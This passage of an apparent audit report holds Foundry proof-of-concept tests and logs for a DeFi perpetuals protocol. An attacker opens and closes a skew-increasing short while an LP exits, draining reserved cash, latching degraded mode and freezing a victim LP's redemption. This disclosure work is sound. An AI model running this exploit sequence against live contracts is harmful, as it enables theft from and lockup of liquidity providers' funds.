        console2.log("  shortMaxProfit   ", shortMax);
        console2.log("  degradedMode     ", engine.degradedMode());
    }

    function _buildBook() internal returns (uint256 attackerSize) {
        _deposit(LONG_BOOK, 1_000_000 * 1e6);
        _open(LONG_BOOK, CfdTypes.Side.LONG, _sizeForNotional(1_800_000 * 1e6), 200_000 * 1e6);

        _deposit(SKEWER, 1_000_000 * 1e6);
        _open(SKEWER, CfdTypes.Side.SHORT, _sizeForNotional(4_500_000 * 1e6), 400_000 * 1e6);

        attackerSize = _sizeForNotional(1_800_000 * 1e6);
        _deposit(ATTACKER, 1_000_000 * 1e6);
    }

    // the seam itself: the whole incoming VPI charge becomes LP-withdrawable free cash even though the
    // pool owes it straight back, and the close pays it out of a gate that reserves only trader claims.
    function test_seam_freeCashAbsorbsVpiWhileRefundObligationIsUnreserved() public {
        console2.log("executionFeeBps    ", engine.executionFeeBps());
        console2.log("settlementBufferBps", engine.settlementBufferBps());

        uint256 attackerSize = _buildBook();
        _report("book built, before attacker open");

        uint256 freeBefore = pool.getFreeAssets();
        uint256 liabilityBefore = _maxLiability();

        _open(ATTACKER, CfdTypes.Side.SHORT, attackerSize, 200_000 * 1e6);
        _report("after attacker SHORT open");

        (,,,,,, int256 vpiAccrued) = engine.positions(ATTACKER);
        console2.log("attacker vpiAccrued (+ = paid into pool)", vpiAccrued);
        assertGt(vpiAccrued, 0, "attacker's skew-increasing open must pay VPI into the pool");

        uint256 freeAfter = pool.getFreeAssets();
        console2.log("getFreeAssets before open", freeBefore);
        console2.log("getFreeAssets after  open", freeAfter);
        console2.log("getFreeAssets growth     ", freeAfter - freeBefore);

        // A1: the refund obligation is nowhere in the reservation, so the pool's own statement of
        // LP-withdrawable cash swallowed the entire charge it now owes back, atom for atom.
        assertEq(
            freeAfter - freeBefore,
            uint256(vpiAccrued),
            "free cash must have grown by exactly the VPI the pool now owes back"
        );

        uint256 poolBeforeClose = pool.totalAssets();
        _close(ATTACKER, CfdTypes.Side.SHORT, attackerSize);
        _report("after attacker SHORT close");

        uint256 liabilityAfter = _maxLiability();
        // the attacker's close released no liability at all, so every atom paid out eroded E - L
        assertEq(liabilityAfter, liabilityBefore, "attacker's close must release no liability");

        console2.log("poolAssets before close", poolBeforeClose);
        console2.log("poolAssets after  close", pool.totalAssets());
        assertLt(pool.totalAssets(), poolBeforeClose, "the pool must have net-paid on this close");
        uint256 paidOut = poolBeforeClose - pool.totalAssets();
        console2.log("pool net payout on a close that released NO liability", paidOut);
        // A2: the payout is the VPI refund net of the close-leg execution fee and accrued carry,
        // and it came out of cash the withdrawal gate had already published as free.
        assertGt(paidOut, 0, "a close releasing no liability still drained pool cash");
        assertLt(paidOut, uint256(vpiAccrued), "the refund is bounded by the VPI the position paid in");
    }

    // realized impact: the LP takes exactly what the protocol told it was free, then the close has to
    // fund the refund out of the liability reserve and the settlement buffer.
    function test_seam_lpWithdrawalThenCloseBreachesLiabilityReserve() public {
        uint256 attackerSize = _buildBook();
        _open(ATTACKER, CfdTypes.Side.SHORT, attackerSize, 200_000 * 1e6);
        (,,,,,, int256 vpiAccrued) = engine.positions(ATTACKER);
        _report("after attacker SHORT open");

        // LP exits with the protocol's own permitted maximum, which now includes the attacker's VPI
        uint256 lpShares = juniorVault.balanceOf(LP);
        vm.prank(LP);
        uint256 redeemId = juniorVault.requestRedeem(lpShares, LP, LP);
        _warpAndRefreshMark(pool.lpEpochStart(redeemId));
        // with open positions HousePool requires the router-bound mark, not the no-position shortcut
        pool.settleLpEpoch(PRICE, block.timestamp);
        uint256 claimableShares = juniorVault.claimableRedeemRequest(redeemId, LP);
        if (claimableShares > 0) {
            vm.prank(LP);
            juniorVault.claimRedeem(redeemId, claimableShares, LP, LP);
        }
        _report("after LP exit of its permitted maximum");

        uint256 eBefore = _effectiveAssets();
        uint256 lBefore = _maxLiability();
        uint256 bBefore = _buffer();
        assertGe(eBefore, lBefore + bBefore, "pre-close state must satisfy the protocol's own E >= L + B");
        assertFalse(engine.degradedMode(), "pre-close state must not be degraded");

        _close(ATTACKER, CfdTypes.Side.SHORT, attackerSize);
        _report("after attacker SHORT close");

        uint256 eAfter = _effectiveAssets();
        uint256 lAfter = _maxLiability();
        uint256 bAfter = _buffer();
        console2.log("E - L before close", eBefore - lBefore);
        console2.log("E - L after  close", eAfter > lAfter ? eAfter - lAfter : 0);
        console2.log("B after close     ", bAfter);
        console2.log("vpi the pool owed back", vpiAccrued);

        // A3: the refund came out of protected cash, so the headroom the buffer is supposed to hold is gone
        assertLt(eAfter - lAfter, eBefore - lBefore, "the close must have eroded the solvency margin");
        assertFalse(
            SolvencyAccountingLib.hasRequiredSettlementBuffer(eAfter, lAfter, engine.settlementBufferBps()),
            "post-close state must fail the engine's own settlement-buffer test"
        );
    }

    // same seam, larger impact tier: once the refund exceeds the settlement buffer the post-close
    // state is outright insolvent by the engine's own definition and the degraded latch fires.
    function test_seam_refundLargerThanBufferLatchesDegradedMode() public {
        // vpiFactor has no upper bound in CfdEngineAdmin._validateRiskParams, so 0.005e18 is a legal
        // configuration; 5x the previous run makes the refund exceed the 25 bps buffer.
        _deployStack(0.005e18);

        uint256 attackerSize = _buildBook();
        _open(ATTACKER, CfdTypes.Side.SHORT, attackerSize, 200_000 * 1e6);
        (,,,,,, int256 vpiAccrued) = engine.positions(ATTACKER);
        console2.log("attacker vpiAccrued at vpiFactor 0.005e18", vpiAccrued);
        _report("after attacker SHORT open");

        uint256 lpShares = juniorVault.balanceOf(LP);
        vm.prank(LP);
        uint256 redeemId = juniorVault.requestRedeem(lpShares, LP, LP);
        _warpAndRefreshMark(pool.lpEpochStart(redeemId));
        pool.settleLpEpoch(PRICE, block.timestamp);
        uint256 claimableShares = juniorVault.claimableRedeemRequest(redeemId, LP);
        if (claimableShares > 0) {
            vm.prank(LP);
            juniorVault.claimRedeem(redeemId, claimableShares, LP, LP);
        }
        _report("after LP exit of its permitted maximum");

        uint256 eBefore = _effectiveAssets();
        uint256 lBefore = _maxLiability();
        assertGe(eBefore, lBefore + _buffer(), "pre-close state must satisfy E >= L + B");
        assertFalse(engine.degradedMode(), "pre-close state must not be degraded");

        _close(ATTACKER, CfdTypes.Side.SHORT, attackerSize);
        _report("after attacker SHORT close");

        uint256 eAfter = _effectiveAssets();
        uint256 lAfter = _maxLiability();
        console2.log("L before close", lBefore);
        console2.log("L after  close", lAfter);
        console2.log("E after  close", eAfter);
        console2.log("L - E shortfall", lAfter > eAfter ? lAfter - eAfter : 0);

        assertEq(lAfter, lBefore, "the close still released no liability");
        assertLt(eAfter, lAfter, "effective assets must now be below the liability envelope");
        assertTrue(engine.degradedMode(), "the engine must have latched degraded mode");
    }

}
```

**PoC 2 of 2, chain escalation to an LP-epoch settlement freeze (the impact).** Run from `packages/perps`: `forge test --match-path 'test/perps/poc/ChainEscalate_VpiRefundDegradedFreeze.t.sol' -vv`.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {CfdEngineAdmin} from "@plether/perps/CfdEngineAdmin.sol";
import {CfdEnginePlanner} from "@plether/perps/CfdEnginePlanner.sol";
import {CfdEngineSettlementSidecar} from "@plether/perps/CfdEngineSettlementSidecar.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {HousePool} from "@plether/perps/HousePool.sol";
import {HousePoolRedemptionMathSidecar} from "@plether/perps/HousePoolRedemptionMathSidecar.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {TerminalNavBookV2} from "@plether/perps/TerminalNavBookV2.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";

import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";

import {SolvencyAccountingLib} from "@plether/perps/libraries/SolvencyAccountingLib.sol";

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

import {VpiMockSettlementToken6} from "../shared/CfdEngineTestBase.sol";

/// the close-path VPI refund is unreserved. pushed far enough it takes the pool below the liability
/// envelope, which latches degraded mode. that latch is a hard stop on every LP epoch settlement: no
/// redemption is funded and no deposit is priced until the owner recapitalizes the shortfall.
contract ChainEscalate_VpiRefundDegradedFreeze is Test {

    VpiMockSettlementToken6 settlementToken;
    CfdEngine engine;
    HousePool pool;
    TrancheVault juniorVault;
    TrancheVault seniorVault;
    MarginClearinghouse clearinghouse;

    uint256 constant CAP_PRICE = 2e8;
    uint256 constant PRICE = 1.6e8;
    uint256 constant ATTACKER_LP_DEPOSIT = 20_000_000 * 1e6;
    uint256 constant VICTIM_LP_DEPOSIT = 500_000 * 1e6;

    address constant LONG_BOOK = address(0x1B);
    address constant SHORT_BOOK = address(0x5B);
    address constant ATTACKER = address(0xA7);
    address constant VICTIM_LP = address(0x1D);

    function getAccountReservations(
        address
    ) external pure returns (IOrderRouterAccounting.AccountReservationView memory reservation) {
        return reservation;
    }

    function getMarginReservationIds(
        address
    ) external pure returns (uint64[] memory) {
        return new uint64[](0);
    }

    function syncMarginQueue(
        address
    ) external pure {}

    /// the live arbitrum-sepolia economics: vpiFactor 1e16, maxSkewRatio 0.4, buffer 25 bps, fee 4 bps
    function _riskParams() internal pure returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 1e16,
            maxSkewRatio: 4e17,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1 * 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _configureBroadSeniorCapacity() internal {
        IHousePool.PoolConfig memory config = IHousePool.PoolConfig({
            seniorRateBps: pool.seniorRateBps(),
            markStalenessLimit: pool.markStalenessLimit(),
            seniorFrozenLpFeeBps: pool.seniorFrozenLpFeeBps(),
            juniorFrozenLpFeeBps: pool.juniorFrozenLpFeeBps(),
            maxSeniorExposureAssets: type(uint256).max - 1,
            maxSeniorShareBps: 9999
        });
        pool.proposePoolConfig(config);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();
    }

    function _deployStack() internal {
        settlementToken = new VpiMockSettlementToken6();
        clearinghouse = new MarginClearinghouse(address(settlementToken));
        engine = new CfdEngine(address(settlementToken), address(clearinghouse), CAP_PRICE, _riskParams(), 50);
        CfdEnginePlanner planner = new CfdEnginePlanner();
        CfdEngineSettlementSidecar settlement = new CfdEngineSettlementSidecar(address(engine));
        CfdEngineAdmin engineAdmin = new CfdEngineAdmin(address(engine), address(this));
        engine.setDependencies(address(planner), address(settlement), address(engineAdmin));
        TerminalNavBookV2 terminalBook = new TerminalNavBookV2(address(engine), uint32(CAP_PRICE));
        engine.setTerminalNavBook(address(terminalBook));
        pool = new HousePool(address(settlementToken), address(engine), address(new HousePoolRedemptionMathSidecar()));
        seniorVault = new TrancheVault(
            IERC20(address(settlementToken)), address(pool), true, "Senior LP", "seniorAssets", 0, address(0)
        );
        juniorVault = new TrancheVault(
            IERC20(address(settlementToken)), address(pool), false, "Junior LP", "juniorAssets", 0, address(0)
        );
        pool.setSeniorVault(address(seniorVault));
        pool.setJuniorVault(address(juniorVault));
        engine.setPool(address(pool));
        engine.setOrderRouter(address(this));
        clearinghouse.setEngine(address(engine));
        _configureBroadSeniorCapacity();
        vm.warp(1_709_532_000);

        settlementToken.mint(address(this), 2000e6);
        settlementToken.approve(address(pool), 2000e6);
        pool.initializeSeedPosition(false, 1000e6, address(this));
        pool.initializeSeedPosition(true, 1000e6, address(this));
        pool.activateTrading();

        _seedLp(ATTACKER, ATTACKER_LP_DEPOSIT);
        _seedLp(VICTIM_LP, VICTIM_LP_DEPOSIT);

        _warpAndRefreshMark(block.timestamp + juniorVault.DEPOSIT_COOLDOWN() + 1);
    }

    function _seedLp(
        address lp,
        uint256 amount
    ) internal {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(juniorVault), type(uint256).max);
        uint256 requestId = juniorVault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        vm.warp(pool.lpEpochStart(requestId));
        engine.updateMarkPrice(PRICE, uint64(block.timestamp));
        pool.settleLpEpoch(0, 0);
        uint256 claimable = juniorVault.claimableDepositRequest(requestId, lp);
        vm.prank(lp);
        juniorVault.claimDeposit(requestId, claimable, lp, lp);
    }

    function _warpAndRefreshMark(
        uint256 timestamp
    ) internal {
        if (timestamp > block.timestamp) {
            vm.warp(timestamp);
        }
        engine.updateMarkPrice(PRICE, uint64(block.timestamp));
    }

    function setUp() public {
        _deployStack();
    }

    function _deposit(
        address account,
        uint256 amount
    ) internal {
        settlementToken.mint(account, amount);
        vm.startPrank(account);
        settlementToken.approve(address(clearinghouse), amount);
        clearinghouse.deposit(account, amount);
        vm.stopPrank();
    }

    function _sizeForNotional(
        uint256 notionalAtoms
    ) internal pure returns (uint256) {
        return (notionalAtoms / PRICE) * CfdTypes.SIZE_QUANTUM;
    }

    function _open(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin
    ) internal {
        engine.processOrderTyped(
            CfdTypes.Order({
                account: account,
                sizeDelta: size,
                marginDelta: margin,
                targetPrice: PRICE,
                commitTime: uint64(block.timestamp),
                commitBlock: uint64(block.number),
                orderId: 0,
                side: side,
                isClose: false
            }),
            PRICE,
            pool.totalAssets(),
            uint64(block.timestamp)
        );
    }

    function _openCall(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin
    ) internal view returns (bytes memory) {
        return abi.encodeCall(
            CfdEngine.processOrderTyped,
            (
                CfdTypes.Order({
                    account: account,
                    sizeDelta: size,
                    marginDelta: margin,
                    targetPrice: PRICE,
                    commitTime: uint64(block.timestamp),
                    commitBlock: uint64(block.number),
                    orderId: 0,
                    side: side,
                    isClose: false
                }),
                PRICE,
                pool.totalAssets(),
                uint64(block.timestamp)
            )
        );
    }

    function _close(
        address account,
        CfdTypes.Side side,
        uint256 size
    ) internal {
        engine.processOrderTyped(
            CfdTypes.Order({
                account: account,
                sizeDelta: size,
                marginDelta: 0,
                targetPrice: 0,
                commitTime: uint64(block.timestamp),
                commitBlock: uint64(block.number),
                orderId: 0,
                side: side,
                isClose: true
            }),
            PRICE,
            pool.totalAssets(),
            uint64(block.timestamp)
        );
    }

    function _maxLiability() internal view returns (uint256) {
        (uint256 longMax,,,) = engine.sides(0);
        (uint256 shortMax,,,) = engine.sides(1);
        return longMax > shortMax ? longMax : shortMax;
    }

    function _effectiveAssets() internal view returns (uint256) {
        uint256 physical = pool.totalAssets();
        uint256 claims = engine.totalTraderClaimBalanceAssets();
        return physical > claims ? physical - claims : 0;
    }

    function _buffer() internal view returns (uint256) {
        return SolvencyAccountingLib.settlementBufferTargetAssets(_maxLiability(), engine.settlementBufferBps());
    }

    function _report(
        string memory label
    ) internal view {
        (uint256 longMax,,,) = engine.sides(0);
        (uint256 shortMax,,,) = engine.sides(1);
        console2.log("---", label);
        console2.log("  poolAssets       ", pool.totalAssets());
        console2.log("  getFreeAssets    ", pool.getFreeAssets());
        console2.log("  effectiveAssets E", _effectiveAssets());
        console2.log("  maxLiability   L ", _maxLiability());
        console2.log("  settlementBuf  B ", _buffer());
        console2.log("  longMaxProfit    ", longMax);
        console2.log("  shortMaxProfit   ", shortMax);
        console2.log("  degradedMode     ", engine.degradedMode());
    }

    function _settleRedeem(
        address lp
    ) internal {
        uint256 shares = juniorVault.balanceOf(lp);
        vm.prank(lp);
        uint256 redeemId = juniorVault.requestRedeem(shares, lp, lp);
        _warpAndRefreshMark(pool.lpEpochStart(redeemId));
        pool.settleLpEpoch(PRICE, block.timestamp);
        uint256 claimableShares = juniorVault.claimableRedeemRequest(redeemId, lp);
        if (claimableShares > 0) {
            vm.prank(lp);
            juniorVault.claimRedeem(redeemId, claimableShares, lp, lp);
        }
    }

    function test_chain_latchedRefundFreezesEveryLpEpochSettlement() public {
        (uint256 vpiFactor,,,,,,,,,) = engine.riskParams();
        console2.log("vpiFactor         ", vpiFactor);
        console2.log("executionFeeBps   ", engine.executionFeeBps());
        console2.log("settlementBufferBps", engine.settlementBufferBps());
        uint256 depth = pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
        console2.log("pool depth D      ", depth);
        console2.log("junior supply     ", juniorVault.totalSupply());
        console2.log("attacker lp shares", juniorVault.balanceOf(ATTACKER));

        // a balanced book whose LONG entry cost is the liability envelope: long max profit equals the
        // full entry cost while a short's max profit is only (CAP/price - 1) of its notional
        uint256 capSkew = (depth * 4) / 10;
        uint256 bookSize = capSkew / 3 + 1e6;
        console2.log("skew cap          ", capSkew);
        console2.log("book notional     ", bookSize);
        _deposit(LONG_BOOK, 1_000_000 * 1e6);
        _open(LONG_BOOK, CfdTypes.Side.LONG, _sizeForNotional(bookSize), 200_000 * 1e6);
        _deposit(SHORT_BOOK, 1_000_000 * 1e6);
        _open(SHORT_BOOK, CfdTypes.Side.SHORT, _sizeForNotional(bookSize), 200_000 * 1e6);
        _report("balanced book open, before attacker");

        // the rest of the cap as new short notional takes the skew from zero to 0.4 x depth
        uint256 attackerSize = _sizeForNotional(capSkew);
        _deposit(ATTACKER, 1_000_000 * 1e6);

        uint256 liabilityBefore = _maxLiability();
        _open(ATTACKER, CfdTypes.Side.SHORT, attackerSize, 500_000 * 1e6);
        _report("after attacker SHORT open");

        (,,,,,, int256 vpiAccrued) = engine.positions(ATTACKER);
        console2.log("attacker vpiAccrued (+ = paid into pool)", vpiAccrued);
        assertGt(vpiAccrued, 0, "attacker's skew-increasing open must pay VPI into the pool");
        assertEq(_maxLiability(), liabilityBefore, "the short must not raise the liability envelope");

        // the attacker holds most of the junior capital; its exit drains the pool to the protected floor
        _settleRedeem(ATTACKER);
        _report("after attacker LP exit");

        uint256 eAfterExit = _effectiveAssets();
        uint256 lAfterExit = _maxLiability();
        console2.log("E - L after LP exit", eAfterExit - lAfterExit);
        console2.log("B                 ", _buffer());
        assertFalse(engine.degradedMode(), "the pool must be solvent before the refund");

        // the victim is an ordinary LP whose redemption request matures while the pool still looks healthy
        uint256 victimShares = juniorVault.balanceOf(VICTIM_LP);
        uint256 victimPrincipal = juniorVault.convertToAssets(victimShares);
        console2.log("victim junior principal (pre-request)", victimPrincipal);
        vm.prank(VICTIM_LP);
        uint256 victimRedeemId = juniorVault.requestRedeem(victimShares, VICTIM_LP, VICTIM_LP);
        uint256 victimCutoff = pool.lpEpochStart(victimRedeemId);
        console2.log("victim redeem epoch start", victimCutoff);

        // the close pays the accrued VPI back out of cash the withdrawal gate counted as protected
        _close(ATTACKER, CfdTypes.Side.SHORT, attackerSize);
        _report("after attacker SHORT close");

        uint256 eAfter = _effectiveAssets();
        uint256 lAfter = _maxLiability();
        console2.log("E after close", eAfter);
        console2.log("L after close", lAfter);
        console2.log("shortfall    ", lAfter > eAfter ? lAfter - eAfter : 0);
        console2.log("victim junior principal frozen", victimPrincipal);

        assertEq(lAfter, liabilityBefore, "the close released no liability");
        assertLt(eAfter, lAfter, "the refund took effective assets below the liability envelope");
        assertTrue(engine.degradedMode(), "the engine must have latched degraded mode");

        // the latch is not cosmetic: once the victim's request is matured, every epoch settlement
        // reverts, so the redemption can never be funded and no new LP can be priced in
        _warpAndRefreshMark(victimCutoff + 2 * pool.LP_EPOCH_DURATION());
        assertEq(juniorVault.claimableRedeemRequest(victimRedeemId, VICTIM_LP), 0, "victim funded nothing");

        (bool settled, bytes memory settleRevert) =
            address(pool).call(abi.encodeCall(IHousePool.settleLpEpoch, (PRICE, block.timestamp)));
        console2.log("settleLpEpoch succeeded?", settled);
        console2.logBytes(settleRevert);
        assertFalse(settled, "the epoch settlement must be refused while the latch is set");
        assertEq(bytes4(settleRevert), IHousePool.HousePool__DegradedMode.selector, "refused for degraded mode");
        console2.log("epoch settlement reverted with HousePool__DegradedMode");

        assertEq(pool.getMaxJuniorWithdraw(), 0, "junior withdrawal capacity must read zero while latched");

        // and the engine refuses new risk for everyone until an owner recapitalization
        _deposit(address(0xBEEF), 100_000 * 1e6);
        (bool opened, bytes memory openRevert) = address(engine).call(
            _openCall(address(0xBEEF), CfdTypes.Side.LONG, _sizeForNotional(10_000 * 1e6), 10_000 * 1e6)
        );
        assertFalse(opened, "opens must be refused while latched");
        assertEq(bytes4(openRevert), ICfdEngineTypes.CfdEngine__TypedOrderFailure.selector, "typed order refusal");
        console2.log("open refused with the typed order failure:");
        console2.logBytes(openRevert);

        // the attacker cannot clear the latch it created
        vm.prank(ATTACKER);
        (bool attackerCleared,) = address(engine).call(abi.encodeCall(CfdEngine.clearDegradedMode, ()));
        assertFalse(attackerCleared, "only the owner may clear the latch");

        // nor can the owner clear it while the pool is still short of the liability envelope
        (bool ownerClearedEarly, bytes memory earlyRevert) =
            address(engine).call(abi.encodeCall(CfdEngine.clearDegradedMode, ()));
        assertFalse(ownerClearedEarly, "an insolvent pool cannot be cleared, even by the owner");
        assertEq(bytes4(earlyRevert), ICfdEngineTypes.CfdEngine__StillInsolvent.selector, "still insolvent");

        // exiting the state costs the owner fresh capital: recapitalize above the envelope, then clear
        uint256 topUp = (lAfter - eAfter) + _buffer() + victimPrincipal + 1_000_000;
        settlementToken.mint(address(this), topUp);
        settlementToken.approve(address(engine), topUp);
        engine.recapitalizePool(topUp);
        _warpAndRefreshMark(block.timestamp);
        engine.clearDegradedMode();
        assertFalse(engine.degradedMode(), "owner capital clears the latch");
        console2.log("owner capital injected", topUp);
        console2.log("pool assets after recapitalization", pool.totalAssets());

        // the inflow is booked as a pending claimant bucket, and the withdrawal snapshot reserves that
        // bucket, so the pool still has no free cash and every LP epoch settlement still stalls
        assertEq(pool.pendingRecapitalizationAssets(), topUp, "the whole inflow is still queued");
        assertEq(pool.getFreeAssets(), 0, "recapitalizing alone frees no withdrawable cash");

        (bool settledAfterRecap, bytes memory afterRecapRevert) =
            address(pool).call(abi.encodeCall(IHousePool.settleLpEpoch, (PRICE, block.timestamp)));
        console2.log("settlement after recapitalization succeeded?", settledAfterRecap);
        console2.logBytes(afterRecapRevert);
        assertFalse(settledAfterRecap, "no epoch can be funded while the inflow is still queued");
        assertTrue(
            bytes4(afterRecapRevert) != IHousePool.HousePool__DegradedMode.selector,
            "the refusal is no longer the degraded-mode latch"
        );
        assertEq(
            bytes4(afterRecapRevert), IHousePool.HousePool__NoLpEpochProgress.selector, "settlement finds no cash"
        );

        // the second half of the owner action: route the queued recapitalization into tranche principal
        (bool assigned,) = address(pool).call(abi.encodeCall(IHousePool.assignUnassignedAssets, (false, address(this))));
        assertTrue(assigned, "the owner can route the recapitalization into tranche principal");
        uint256 freeAfterAssign = pool.getFreeAssets();
        console2.log("free assets after routing", freeAfterAssign);
        console2.log("juniorPrincipal after routing", pool.juniorPrincipal());
        assertEq(pool.pendingRecapitalizationAssets(), 0, "the bucket is drained");
        assertGt(freeAfterAssign, 0, "routing the recapitalization frees withdrawable cash");

        // FIFO: the attacker's own request was only partly funded at its exit, so it still owns the head
        uint256 headId = juniorVault.redeemQueueHead();
        (uint256 headShares, uint256 headFundedBefore,,,,,,,,) = juniorVault.redeemEpochs(headId);
        console2.log("redeem queue head", headId);
        console2.log("victim request id", victimRedeemId);
        assertLt(headId, victimRedeemId, "the attacker's residual request is still ahead of the victim");

        (bool settledAfterRouting, bytes memory afterRoutingRevert) =
            address(pool).call(abi.encodeCall(IHousePool.settleLpEpoch, (PRICE, block.timestamp)));
        console2.log("settlement after routing succeeded?", settledAfterRouting);
        console2.logBytes(afterRoutingRevert);
        assertTrue(settledAfterRouting, "settlement resumes once the recapitalization is routed");

        IHousePool.LpEpochSettlementResult memory result =
            abi.decode(afterRoutingRevert, (IHousePool.LpEpochSettlementResult));
        console2.log("juniorFundedAssets", result.juniorFundedAssets);
        console2.log("juniorProcessedEpochs", result.juniorProcessedEpochs);
        assertGt(result.juniorFundedAssets, 0, "the settlement funded a junior redemption epoch");
        (uint256 headSharesAfter, uint256 headFundedAfter,,,,,,,,) = juniorVault.redeemEpochs(headId);
        assertEq(headSharesAfter, headShares, "the head epoch is unchanged");
        assertGt(headFundedAfter, headFundedBefore, "the recovered cash paid the queue head, not the victim");
    }

}

```

## PoC Output

Captured verbatim from the terminal. Run from `packages/perps` at commit `a82d4fe`.

```bash
Ran 3 tests for test/perps/poc/NumericalGap_VpiRebateReserveRaid.t.sol:NumericalGap_VpiRebateReserveRaid
[PASS] test_seam_freeCashAbsorbsVpiWhileRefundObligationIsUnreserved() (gas: 5623494)
Logs:
  executionFeeBps     4
  settlementBufferBps 25
  --- book built, before attacker open
    poolAssets        5002728682305
    pool.getFreeAssets 3198228682305
    effectiveAssets E 5002728682305
    maxLiability   L  1800000000000
    settlementBuf  B  4500000000
    longMaxProfit     1800000000000
    shortMaxProfit    1125000000000
    degradedMode      false
  --- after attacker SHORT open
    poolAssets        5004023975416
    pool.getFreeAssets 3199523975416
    effectiveAssets E 5004023975416
    maxLiability   L  1800000000000
    settlementBuf  B  4500000000
    longMaxProfit     1800000000000
    shortMaxProfit    1575000000000
    degradedMode      false
  attacker vpiAccrued (+ = paid into pool) 1295293111
  getFreeAssets before open 3198228682305
  getFreeAssets after  open 3199523975416
  getFreeAssets growth      1295293111
  --- after attacker SHORT close
    poolAssets        5003449017592
    pool.getFreeAssets 3198949017592
    effectiveAssets E 5003449017592
    maxLiability   L  1800000000000
    settlementBuf  B  4500000000
    longMaxProfit     1800000000000
    shortMaxProfit    1125000000000
    degradedMode      false
  poolAssets before close 5004023975416
  poolAssets after  close 5003449017592
  pool net payout on a close that released NO liability 574957824

[PASS] test_seam_lpWithdrawalThenCloseBreachesLiabilityReserve() (gas: 6698901)
Logs:
  --- after attacker SHORT open
    poolAssets        5004023975416
    pool.getFreeAssets 3199523975416
    effectiveAssets E 5004023975416
    maxLiability   L  1800000000000
    settlementBuf  B  4500000000
    longMaxProfit     1800000000000
    shortMaxProfit    1575000000000
    degradedMode      false
  --- after LP exit of its permitted maximum
    poolAssets        1804500000000
    pool.getFreeAssets 0
    effectiveAssets E 1804500000000
    maxLiability   L  1800000000000
    settlementBuf  B  4500000000
    longMaxProfit     1800000000000
    shortMaxProfit    1575000000000
    degradedMode      false
  --- after attacker SHORT close
    poolAssets        1803924992062
    pool.getFreeAssets 0
    effectiveAssets E 1803924992062
    maxLiability   L  1800000000000
    settlementBuf  B  4500000000
    longMaxProfit     1800000000000
    shortMaxProfit    1125000000000
    degradedMode      false
  E - L before close 4500000000
  E - L after  close 3924992062
  B after close      4500000000
  vpi the pool owed back 1295293111

[PASS] test_seam_refundLargerThanBufferLatchesDegradedMode() (gas: 10524157)
Logs:
  attacker vpiAccrued at vpiFactor 0.005e18 6472695062
  --- after attacker SHORT open
    poolAssets        5012115582543
    pool.getFreeAssets 3207615582543
    effectiveAssets E 5012115582543
    maxLiability   L  1800000000000
    settlementBuf  B  4500000000
    longMaxProfit     1800000000000
    shortMaxProfit    1575000000000
    degradedMode      false
  --- after LP exit of its permitted maximum
    poolAssets        1804500000000
    pool.getFreeAssets 0
    effectiveAssets E 1804500000000
    maxLiability   L  1800000000000
    settlementBuf  B  4500000000
    longMaxProfit     1800000000000
    shortMaxProfit    1575000000000
    degradedMode      false
  --- after attacker SHORT close
    poolAssets        1798747597406
    pool.getFreeAssets 0
    effectiveAssets E 1798747597406
    maxLiability   L  1800000000000
    settlementBuf  B  4500000000
    longMaxProfit     1800000000000
    shortMaxProfit    1125000000000
    degradedMode      true
  L before close 1800000000000
  L after  close 1800000000000
  E after  close 1798747597406
  L - E shortfall 1252402594

Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 48.93ms (71.75ms CPU time)

Ran 1 test suite in 51.00ms (48.93ms CPU time): 3 tests passed, 0 failed, 0 skipped (3 total tests)
**PoC 2 output** (chain escalation, `test_chain_latchedRefundFreezesEveryLpEpochSettlement`):
```

```bash
Compiler run successful with warnings:
Ran 1 test for test/perps/poc/ChainEscalate_VpiRefundDegradedFreeze.t.sol:ChainEscalate_VpiRefundDegradedFreeze
[PASS] test_chain_latchedRefundFreezesEveryLpEpochSettlement() (gas: 9804518)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 81.05ms (33.27ms CPU time)
Ran 1 test suite in 85.73ms (81.05ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
